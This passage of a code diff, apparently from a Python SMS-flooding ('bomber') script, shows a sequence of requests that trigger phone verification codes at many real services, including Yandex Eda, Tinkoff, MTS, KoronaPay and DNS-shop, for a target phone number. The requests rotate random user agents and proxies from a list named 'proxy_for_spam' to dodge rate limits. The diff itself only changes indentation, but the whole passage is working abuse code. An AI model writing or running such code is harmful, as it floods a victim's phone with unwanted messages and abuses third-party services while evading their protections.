 		requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode",json={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.get("https://findclone.ru/register",params={"phone": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("http://212.22.223.149:7200/api/account/register/sendConfirmCode",json={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://back.zecredit.com.ua/v1/api/rest/verifications", json={'phone': phone, 'action': 'REGISTRATION'},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/',headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)}, data={'FastAuthorizationLoginLoadForm[login]': phone, 'FastAuthorizationLoginLoadForm[token]': ''})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	head = {
 		"User-Agent": generate_user_agent(device_type="desktop", os=("mac", "linux")),
 		"X-Requested-With": "XMLHttpRequest",
